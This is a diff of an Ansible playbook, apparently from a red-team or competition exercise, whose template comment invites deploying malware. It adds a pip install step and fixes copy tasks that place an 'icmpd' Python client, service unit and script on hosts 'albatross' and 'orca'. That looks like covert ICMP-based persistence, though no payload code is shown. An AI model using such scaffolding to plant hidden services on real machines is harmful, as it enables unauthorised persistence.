@@ -2,27 +2,31 @@
 # This is an example task
 # add your tasks to deploy your malware here
 
+- name: PipDownload | Run | Run on Linux 
+  shell: "apt-get install pip"
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
+
 - name: Install bottle python package
   ansible.builtin.pip:
     name: scapy
 
 - name: icupClientDeploy | Copy file | Adds icup client
   copy:
-    source: "files/icmpd.py"
+    src: "files/icmpd.py"
     dest: "{{ icuplocation }}"
     mode: 0555
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
 - name: icupServiceDeploy | Copy file | Adds icup service
   copy:
-    source: "files/icmpd.service"
+    src: "files/icmpd.service"
     dest: "{{ servicelocation }}"
     mode: 0555
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
 - name: icupScriptDeploy | Copy file | Adds icup script
   copy:
-    source: "files/icmpd.sh"
+    src: "files/icmpd.sh"
     dest: "{{ scriptlocation }}"
     mode: 0555
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
